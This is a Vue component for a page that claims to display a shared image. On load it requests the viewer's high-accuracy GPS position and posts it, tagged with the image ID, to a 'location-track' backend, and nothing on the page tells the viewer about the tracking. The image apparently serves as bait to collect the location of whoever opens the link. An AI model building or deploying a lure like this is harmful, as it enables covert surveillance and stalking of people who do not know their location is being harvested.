<template>
  <div class="pt-10 flex flex-col  items-center h-screen bg-gray-100">
    <div class="text-3xl font-bold">
      Image
    </div>
    <div class="relative pt-14">
      <img 
        :src="imageUrl" 
        alt="Shared Image" 
        v-if="imageUrl" 
        class="rounded-lg shadow-lg border-4 border-gray-300 hover:scale-105 transition-transform duration-300 ease-in-out"
      />
      <div v-if="!imageUrl" class="text-gray-500 text-lg">Loading Image...</div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, watch } from 'vue';
import axios from 'axios';
import { useRoute } from 'vue-router';

const route = useRoute();
const imageUrl = ref('');

// Function to track the location and send it to the server
const trackLocation = async () => {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;
        const location = { latitude, longitude };
        console.log('Accurate Location:', location);

        // Update the imageUrl based on the route params
        imageUrl.value = `https://location-track-back-end-django.onrender.com/api/view/${route.params.imageUrl}/`;

        try {
          // Send the location data to the server
          await axios.post('https://location-track-back-end-django.onrender.com/api/track/', {
            imageId: route.params.imageUrl,
            location,
          });
          console.log('Location sent to the server');
        } catch (error) {
          console.error('Error sending location:', error);
        }
      },
      (error) => {
        console.error('Error getting location:', error);
      },
      {
        enableHighAccuracy: true, // Enables high accuracy GPS coordinates
        timeout: 5000, // Maximum wait time of 5 seconds
        maximumAge: 0, // Ensures fresh data, no caching
      }
    );
  } else {
    console.error('Geolocation is not supported by this browser.');
  }
};

// Watch for changes to imageUrl (if necessary)
watch(
  () => imageUrl,
  () => {
    imageUrl.value = `https://location-track-back-end-django.onrender.com/api/view/${route.params.imageUrl}/`;
  }
);

// When the component mounts, get the image and track the location
onMounted(() => {
  console.log('Image ID:', route.params.imageUrl);
  const imageId = route.params.imageUrl;
  const link = `https://location-track-back-end-django.onrender.com/api/view/${route.params.imageUrl}/`;
  imageUrl.value = link;
  console.log('Image URL:', imageUrl.value);
  trackLocation(); // Track the user's location when the component is mounted
});
</script>

